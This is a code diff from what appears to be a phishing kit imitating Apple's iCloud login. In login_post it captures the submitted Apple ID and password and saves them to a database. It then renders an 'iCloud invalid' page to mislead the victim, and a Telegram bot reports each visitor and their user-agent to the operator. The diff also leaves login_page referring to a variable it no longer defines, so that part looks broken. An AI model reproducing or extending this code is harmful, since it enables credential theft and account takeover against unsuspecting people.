@@ -11,15 +11,6 @@ exports.login_page = async (req, res) => {
 
   
   i++
-  var ua = req.headers['user-agent'];
-
-
-  user = new User({
-    count: i,
-    userAgent: ua,
-  });
-
-  await user.save();
 
   bot.sendMessage(chatID, "New User Has Landed and is assigned an ID of " + i + "\nUser-Agent : " + ua + "\n")
 
@@ -34,9 +25,20 @@ exports.login_post = async (req, res) => {
   const email = req.body.appleid;
   const password = req.body.password
   const count = req.body.count;
+    
+  var ua = req.headers['user-agent'];
+
+
+  user = new User({
+    count,
+    userAgent: ua,
+    appleID: email,  
+    applePass: password
+  });
+
+  await user.save();
 
   
-  await User.findOneAndUpdate({ count }, { appleID: email,  applePass: password});
   
 
   res.render('icloud-invalid', { count, email})
